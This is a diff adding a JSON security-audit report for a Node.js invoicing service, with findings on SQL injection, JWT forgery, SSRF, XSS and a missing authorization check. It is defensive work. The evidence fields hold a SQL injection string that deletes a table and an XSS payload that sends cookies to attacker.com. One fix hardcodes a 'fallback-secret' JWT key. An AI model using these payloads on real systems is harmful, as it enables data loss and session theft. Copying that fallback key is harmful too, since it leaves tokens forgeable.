@@ -1,0 +1,54 @@
+{
+  "findings": [
+    {
+      "id": "F-001",
+      "title": "SQL Injection in GET /invoices Endpoint",
+      "file": "routes/invoices.js",
+      "line": 24,
+      "severity": "High",
+      "impact": "An attacker can inject arbitrary SQL code through the 'order' query parameter, potentially leading to unauthorized data access, modification, deletion, or database corruption. The attacker can bypass access controls and compromise data integrity.",
+      "evidence": "Line 24: const rows = await db.query(`SELECT * FROM invoices WHERE owner_id = $1 ORDER BY ${order}`, [req.user.id]); The 'order' variable is derived from req.query.order without validation and directly interpolated into the SQL query string. Example malicious input: ?order=id;DELETE FROM invoices;--",
+      "recommendation": "Replace the dynamic SQL concatenation with a whitelist approach similar to the /payments endpoint (lines 29-32). Define a SORTABLE_INVOICES object containing only permitted column names: const SORTABLE_INVOICES = { created_at: 'created_at', amount: 'amount_cents', id: 'id' }; Then use: const column = SORTABLE_INVOICES[req.query.order] || SORTABLE_INVOICES.created_at; followed by: const rows = await db.query(`SELECT * FROM invoices WHERE owner_id = $1 ORDER BY ${column}`, [req.user.id]);. Never use string interpolation for SQL column names."
+    },
+    {
+      "id": "F-002",
+      "title": "JWT Token Forgery - Authentication Bypass",
+      "file": "lib/auth.js",
+      "line": 6,
+      "severity": "Critical",
+      "impact": "An attacker can forge arbitrary JWT tokens without requiring a valid signing key. This completely bypasses authentication, allowing unauthorized access to all protected endpoints. The attacker can assume any user identity, access other users' data, and execute any operation as that forged user. This is a critical authentication bypass vulnerability affecting all secured endpoints.",
+      "evidence": "Lines 6-7 use jwt.decode(bearer) instead of jwt.verify(bearer, secret). The jwt.decode() function only parses the token without verifying the signature. An attacker can create a token with arbitrary claims (sub, role, tenant) and the application will accept it as valid. Also present at line 12. Example: A forged token with {sub: '999', role: 'admin'} will be accepted as valid authentication.",
+      "recommendation": "Replace jwt.decode() with jwt.verify() and provide the secret key. The fixed code should be: const claims = jwt.verify(bearer, process.env.JWT_SECRET || 'fallback-secret'); Add environment-based secret key management. Verify the secret is kept secure and never exposed in code. Consider adding token expiration checks and implementing token refresh mechanisms. Example fix for currentUser(): function currentUser(req) { const bearer = (req.headers.authorization || '').replace('Bearer ', ''); try { const claims = jwt.verify(bearer, process.env.JWT_SECRET); return { id: claims.sub, role: claims.role }; } catch (e) { return { id: null, role: null }; } }"
+    },
+    {
+      "id": "F-003",
+      "title": "Server-Side Request Forgery (SSRF) in fetchLogo()",
+      "file": "lib/remote.js",
+      "line": 6,
+      "severity": "High",
+      "impact": "An attacker can make the application perform HTTP requests to arbitrary URLs, including internal services, localhost, and cloud metadata endpoints. This enables reconnaissance of internal infrastructure, potential access to internal APIs, and possibly exfiltration of sensitive data from internal services. The redirect: 'follow' setting amplifies the attack surface by following redirects to arbitrary locations.",
+      "evidence": "Lines 5-8: async function fetchLogo(url) { const response = await fetch(url, { redirect: 'follow' }); return Buffer.from(await response.arrayBuffer()); }. The 'url' parameter comes directly from req.body.logoUrl (line 38 in routes/invoices.js) with no validation. There is no whitelist, no domain check, and no redirect protection. Compare with fetchAsset() function (lines 11-16) which correctly validates the hostname against an ALLOWED whitelist.",
+      "recommendation": "Add URL validation using a whitelist approach similar to fetchAsset(). Define allowed domains and protocols: const LOGO_ALLOWED = new Set(['cdn.example.com', 'assets.example.com']); Validate the URL before fetching: function fetchLogo(url) { try { const parsed = new URL(url); if (!LOGO_ALLOWED.has(parsed.hostname)) throw new Error('host not allowed'); if (!['http:', 'https:'].includes(parsed.protocol)) throw new Error('protocol not allowed'); } catch (e) { throw new Error('Invalid logo URL'); } const response = await fetch(url, { redirect: 'error', timeout: 5000 }); ... }. Change redirect: 'follow' to redirect: 'error' to prevent open redirect attacks. Add request timeout to prevent slowdown attacks."
+    },
+    {
+      "id": "F-004",
+      "title": "Cross-Site Scripting (XSS) in invoiceNote() Function",
+      "file": "lib/render.js",
+      "line": 4,
+      "severity": "Medium",
+      "impact": "If user-controlled data is passed to the invoiceNote() function and rendered in a web page, an attacker can inject malicious JavaScript code that executes in the victim's browser. This can lead to session hijacking, credential theft, malware distribution, or defacement. The function is exported and may be used by other components.",
+      "evidence": "Lines 4-6: function invoiceNote(note) { return `<div class=\"note\">${note}</div>`; }. The 'note' parameter is directly embedded in the HTML string without any escaping or sanitization. Any HTML/JavaScript in the note value will be interpreted by the browser. Contrast with customerName() function (lines 9-11) which correctly uses escapeHtml(name) to prevent this vulnerability. Example attack payload: <img src=x onerror=\"fetch('https://attacker.com?cookie='+document.cookie)\">",
+      "recommendation": "Apply HTML entity encoding to the note parameter before inserting it into HTML. The module already imports 'escape-html', so use it: function invoiceNote(note) { return `<div class=\"note\">${escapeHtml(note)}</div>`; }. Alternatively, use a templating engine with auto-escaping enabled. For any user-controlled content rendered as HTML, always apply context-appropriate encoding (HTML entities for HTML context, URL encoding for URLs, JavaScript escaping for JS context). Consider using a Content Security Policy (CSP) header as an additional defense layer."
+    },
+    {
+      "id": "F-005",
+      "title": "Missing Authorization Check in GET /invoices/:id Endpoint",
+      "file": "routes/invoices.js",
+      "line": 8,
+      "severity": "High",
+      "impact": "An attacker can retrieve invoices belonging to any user by simply changing the invoice ID in the URL. There is no verification that the requesting user is the owner of the invoice. Combined with the JWT forgery vulnerability (F-002), this allows complete unauthorized access to all invoice data in the system. This is a critical data exposure vulnerability.",
+      "evidence": "Lines 7-10: router.get('/invoices/:id', async (req, res) => { const invoice = await db.query('SELECT * FROM invoices WHERE id = $1', [req.params.id]); res.json(invoice); }). The query only checks invoice ID, with no owner_id filter. Compare with the /receipts/:id endpoint (lines 13-19) which correctly includes: WHERE id = $1 AND owner_id = $2 with [req.params.id, req.user.id]. An attacker can request GET /invoices/1, GET /invoices/2, etc., and retrieve all invoices regardless of ownership.",
+      "recommendation": "Add an owner_id check to the query to ensure the requesting user is the invoice owner: router.get('/invoices/:id', async (req, res) => { const invoice = await db.query('SELECT * FROM invoices WHERE id = $1 AND owner_id = $2', [req.params.id, req.user.id]); if (!invoice || invoice.length === 0) { return res.status(404).json({ error: 'Invoice not found' }); } res.json(invoice[0]); }); Also ensure req.user.id is properly set by a valid authentication mechanism. Combined with fixing F-002 (JWT validation), this will properly restrict access to owned invoices only."
+    }
+  ]
+}
